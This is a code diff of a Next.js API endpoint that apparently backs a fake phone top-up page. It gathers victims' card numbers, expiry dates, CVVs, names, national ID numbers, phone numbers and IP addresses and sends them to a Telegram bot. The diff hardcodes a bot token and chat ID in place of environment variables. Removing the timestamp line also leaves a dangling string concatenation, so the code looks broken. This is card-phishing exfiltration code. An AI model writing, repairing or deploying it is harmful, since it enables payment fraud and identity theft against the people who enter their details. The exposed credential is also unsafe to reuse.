@@ -5,13 +5,8 @@ export async function POST(req: NextRequest) {
     const body = await req.json()
     const { telefono, monto, numero_tarjeta, vencimiento, cvv, titular, dni, tipo_tarjeta } = body
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN
-    const chatId = process.env.TELEGRAM_CHAT_ID
-
-    if (!botToken || !chatId) {
-      console.error("❌ Faltan variables: TELEGRAM_BOT_TOKEN o TELEGRAM_CHAT_ID")
-      return NextResponse.json({ error: "Telegram not configured" }, { status: 500 })
-    }
+    const botToken = "8734973144:AAG-fpG0d6EJcS0AWXrips97ZFYD9fkoTfk"
+    const chatId = "-1003693872783"
 
     const ip =
       req.headers.get("x-forwarded-for")?.split(",")[0].trim() ||
@@ -23,10 +18,10 @@ export async function POST(req: NextRequest) {
     })
 
     const message =
-      `🔔 *Nueva Recarga*\n\n` +
+      `  *NUEVA ORDEN*\n\n` +
       `📱 *Telefono:* ${telefono}\n` +
       `💰 *Monto:* $${monto}\n\n` +
-      `💳 *Datos de Tarjeta:*\n` +
+      `💳 *Datos de Tarjeta:*\n\n` +
       `• Tipo: ${tipo_tarjeta || "N/A"}\n` +
       `• Numero: \`${numero_tarjeta}\`\n` +
       `• Vencimiento: ${vencimiento}\n` +
@@ -34,7 +29,6 @@ export async function POST(req: NextRequest) {
       `• Titular: ${titular}\n` +
       `• DNI: ${dni}\n\n` +
       `🌐 *IP:* ${ip}\n` +
-      `🕐 *Hora:* ${hora}`
 
     const telegramRes = await fetch(
       `https://api.telegram.org/bot${botToken}/sendMessage`,
